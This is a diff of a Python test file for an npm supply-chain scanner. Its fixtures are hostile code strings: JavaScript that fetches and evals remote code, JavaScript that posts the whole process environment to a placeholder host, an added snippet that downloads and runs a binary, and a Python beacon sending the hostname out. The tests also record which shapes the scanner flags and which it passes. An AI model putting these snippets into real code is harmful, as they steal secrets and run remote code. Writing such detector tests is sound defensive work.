@@ -15,6 +15,10 @@ FETCH_RUN_JS = ("const axios = require('axios');\n(async function () {\n"
                 "  const s = (await axios.get(src)).data;\n  eval(s);\n})();\n")
 HARVEST_JS = ("module.exports = async () => {\n"
               "  await fetch('https://api.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });\n};\n")
+DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
+                   "const {execFileSync} = require('child_process');\n"
+                   "module.exports = () => https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream("
+                   "'/tmp/tool'))\n  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")
 BEACON_PY = ("import socket, requests\n\ndef report():\n"
              "    requests.post('https://x.oastify.com/', data=socket.gethostname())\n")
 MANIFEST = '{"name": "x", "version": "1.0.0", "main": "index.js"}'
@@ -42,9 +46,14 @@ class UseRiskTests(unittest.TestCase):
                       [(i["file"], i["sev"]) for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"])
 
     def test_only_the_strong_shapes(self):
-        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/env.js": HARVEST_JS})
+        # a file downloaded and then run (a binary's installer) is MAJOR at import time: not one
+        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/fetch.js": DOWNLOAD_RUN_JS})
         self.assertEqual(use_risk(res), [])
         self.assertEqual(res["verdict"], "OK", res["verdictReason"])
+        # rule set 2.17: the whole environment sent anywhere is one
+        res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/env.js": HARVEST_JS})
+        self.assertEqual(use_risk(res), [("lib/env.js", "CRITICAL")])
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
 
     def test_files_that_never_run_when_the_package_is_used(self):
         for folder in ("test", "__tests__", "examples", "docs", "demo", "benchmarks", "out/_next/static/chunks",
@@ -56,8 +65,9 @@ class UseRiskTests(unittest.TestCase):
 
     def test_not_read_once_suspicious_nor_past_the_size_limit(self):
         from lazaret.registry import repo
-        obfuscated = "var " + ", ".join(f"_0x{k:04x} = {k}" for k in range(6)) + ";\n"
-        res = scan_npm({"package.json": MANIFEST, "index.js": obfuscated, "lib/report.js": BEACON_JS})
+        # SUSPICIOUS at import already (0.1.8: `_0x` names alone are MAJOR, so code that runs what it
+        # fetches makes it so)
+        res = scan_npm({"package.json": MANIFEST, "index.js": FETCH_RUN_JS, "lib/report.js": BEACON_JS})
         self.assertEqual((res["verdict"], use_risk(res)), ("SUSPICIOUS", []))
         padded = BEACON_JS + "// " + "x" * repo.USE_RISK_MAX_CHARS + "\n"
         res = scan_npm({"package.json": MANIFEST, "index.js": "module.exports = 1;\n", "lib/report.js": padded})
